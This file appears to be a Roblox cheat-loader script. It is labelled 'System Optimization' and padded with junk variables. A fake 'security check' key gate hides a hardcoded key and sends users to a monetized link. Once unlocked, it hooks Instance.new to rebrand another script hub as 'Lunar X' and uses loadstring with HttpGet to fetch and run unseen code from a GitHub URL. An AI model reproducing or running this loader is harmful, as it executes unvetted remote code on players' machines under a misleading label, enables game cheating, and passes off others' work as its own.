
--// System Optimization v6.89
local jaRupLsE = 26635; -- junk var
local uCAzLflT = 99328; -- junk var
local xhOgwHyK = 57306; -- junk var
local xkeeVvMD = 16927; -- junk var
local lLOtRRIb = 35191; -- junk var
local KybQEbUG = 65559; -- junk var
local pMBoRrZn = 80809; -- junk var
local QCPzLjMU = 66595; -- junk var
local hKYTRDPL = 90905; -- junk var
local rFrPWGfI = 85008; -- junk var
local kZoEnXrZ = 74409; -- junk var
local PDWGzymA = 97073; -- junk var
local IuzxnOMV = 84005; -- junk var
local HtegqORy = 4985; -- junk var
local CMynwgEi = 33850; -- junk var
local VEeLjrNY = 95076; -- junk var
local NoyuapoG = 33498; -- junk var
local tpgnvkiO = 49354; -- junk var
local iqbSENLA = 68073; -- junk var
local YXxUjDzE = 97482; -- junk var
local eYisgupl = 75557; -- junk var
local zNMFdnRQ = 8079; -- junk var
local QnfTCfMl = 62042; -- junk var
local zMLVClvI = 68122; -- junk var

--// MAIN EXECUTION START
task.spawn(function()
    local s, e = pcall(function()
        --[[ Secured by Lamperuz Auto | ID: 4ab296671ba04fd0a420ee436394629e ]]
local _k = {108, 97, 109, 112, 101, 114, 117, 122, 49, 50, 51}
local CoreGui = game:GetService("CoreGui")
if CoreGui:FindFirstChild("oxcfKS") then CoreGui["oxcfKS"]:Destroy() end

local oxcfKS = Instance.new("ScreenGui", CoreGui)
oxcfKS.Name = "oxcfKS"
local wCWJOgo = Instance.new("Frame", oxcfKS)
local hQfbiQUk = Instance.new("TextBox", wCWJOgo)

wCWJOgo.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
wCWJOgo.BorderSizePixel = 0
wCWJOgo.Position = UDim2.new(0.5, -175, 0.5, -100)
wCWJOgo.Size = UDim2.new(0, 350, 0, 200)
wCWJOgo.Active = true
wCWJOgo.Draggable = true
Instance.new("UICorner", wCWJOgo).CornerRadius = UDim.new(0, 8)

local tit = Instance.new("TextLabel", wCWJOgo)
tit.Size = UDim2.new(1, 0, 0, 45)
tit.BackgroundTransparency = 1
tit.Text = "SECURITY CHECK"
tit.TextColor3 = Color3.new(1,1,1)
tit.Font = Enum.Font.GothamBold
tit.TextSize = 18

hQfbiQUk.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
hQfbiQUk.Position = UDim2.new(0.1, 0, 0.35, 0)
hQfbiQUk.Size = UDim2.new(0.8, 0, 0, 38)
hQfbiQUk.PlaceholderText = "Enter Key..."
hQfbiQUk.Text = ""
hQfbiQUk.TextColor3 = Color3.new(1,1,1)
hQfbiQUk.Font = Enum.Font.Gotham
Instance.new("UICorner", hQfbiQUk)

local b_log = Instance.new("TextButton", wCWJOgo)
local b_get = Instance.new("TextButton", wCWJOgo)

local function style_btn(b, p, t, c)
    b.Position = p
    b.Size = UDim2.new(0.38, 0, 0, 38)
    b.Text = t
    b.BackgroundColor3 = c
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b)
end

style_btn(b_log, UDim2.new(0.1, 0, 0.65, 0), "LOGIN", Color3.fromRGB(101, 167, 165))
style_btn(b_get, UDim2.new(0.52, 0, 0.65, 0), "GET KEY", Color3.fromRGB(60, 60, 60))

b_get.MouseButton1Click:Connect(function()
    setclipboard("https://link-center.net/2628650/0udtrz0wIh7A")
    b_get.Text = "COPIED"
    task.wait(1.5)
    b_get.Text = "GET KEY"
end)

b_log.MouseButton1Click:Connect(function()
    local inp = hQfbiQUk.Text:gsub("%s+", "")
    if #inp ~= #_k then b_log.Text = "BAD KEY" task.wait(1) b_log.Text = "LOGIN" return end
    
    local v = true
    for i=1, #inp do if string.byte(inp, i) ~= _k[i] then v = false end end
    
    if v then
        b_log.Text = "SUCCESS"
        task.wait(0.5)
        oxcfKS:Destroy()
        
        -- ЗАПУСК УНИКАЛИЗАТОРА И ЦЕЛЕВОГО СКРИПТА
        
        -- === [ LAMPERUZ UNIQUEIZER START ] ===
        local MY_NAME = "Lunar X"
        local ACCENT_COLOR = Color3.fromRGB(101, 167, 165) 
        
        local oldInstanceNew = Instance.new
        
        local function newInstanceHook(class, parent)
            local obj = oldInstanceNew(class, parent)
            task.spawn(function()
                task.wait() 
                -- 1. Подмена текста
                if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                    if #obj.Text > 3 or obj.Text:find("Hub") then
                        if obj.Size.Y.Offset > 15 or obj.Name:find("Title") then
                            obj.Text = MY_NAME
                        end
                    end
                end
                -- 2. Подмена цвета
                if obj:IsA("Frame") or obj:IsA("TextButton") or obj:IsA("ScrollingFrame") then
                    local c = obj.BackgroundColor3
                    if (c.r > 0.1 or c.g > 0.1 or c.b > 0.1) and (c.r < 0.9) then
                        obj.BackgroundColor3 = ACCENT_COLOR
                    end
                end
                -- 3. Подмена обводки
                if obj:IsA("UIStroke") then
                    obj.Color = ACCENT_COLOR
                end
            end)
            return obj
        end
        
        if getgenv then
            getgenv().Instance = {new = newInstanceHook}
        end
        
        -- Запуск целевого скрипта
        local success, err = pcall(function() 
            loadstring(game:HttpGet("https://raw.githubusercontent.com/blackowl1231/Z3US/refs/heads/main/main.lua"))() 
        end)
        if not success then warn("Script Load Error: " .. tostring(err)) end
        -- === [ LAMPERUZ UNIQUEIZER END ] ===
    
    else
        b_log.Text = "WRONG"
        task.wait(1)
        b_log.Text = "LOGIN"
    end
end)

    end)
    if not s then warn("Loader Error: " .. tostring(e)) end
end)
--// MAIN EXECUTION END
--// System Optimization v5.90
local ImnqgSGS = 44857; -- junk var
local ncJtLwDz = 98792; -- junk var
local iLTVLTCe = 56877; -- junk var
local nuAeXSTe = 80647; -- junk var
local MwexDDou = 11084; -- junk var
local etBnuwuM = 20899; -- junk var
local InnfPoEg = 33478; -- junk var
local NeUJtoCr = 45529; -- junk var
local lkbMBHje = 99411; -- junk var
local RmMXWBZM = 52154; -- junk var
local SUQKOniX = 31415; -- junk var
local khCaYmFV = 93960; -- junk var
local LNlbLfmV = 80895; -- junk var
local ySyBwKfP = 6581; -- junk var
local sQQUMiwq = 6425; -- junk var
local MILEPDfD = 85476; -- junk var
local OUuwyZNh = 28141; -- junk var
local CxNXkcJE = 18256; -- junk var
local tQnQtXTg = 86352; -- junk var
local clcCPCbi = 61846; -- junk var
local LhlDnFcZ = 86513; -- junk var
local vRRLeSPt = 29517; -- junk var
local UDacdWuT = 88227; -- junk var
local nXxEtZmH = 36202; -- junk var
local NiMTpXMc = 62269; -- junk var
local XgevwHDL = 75910; -- junk var
local FavQzXOc = 75813; -- junk var
local XxXaZJyl = 25060; -- junk var
local flMPRUUe = 90011; -- junk var
local HQxfzAZl = 32310; -- junk var
local NwMvUkLt = 39729; -- junk var
local JpuhVHlJ = 99197; -- junk var
local qDydsldU = 47493; -- junk var
local UCMKJcTU = 74812; -- junk var
local ecMHSMNe = 39215; -- junk var

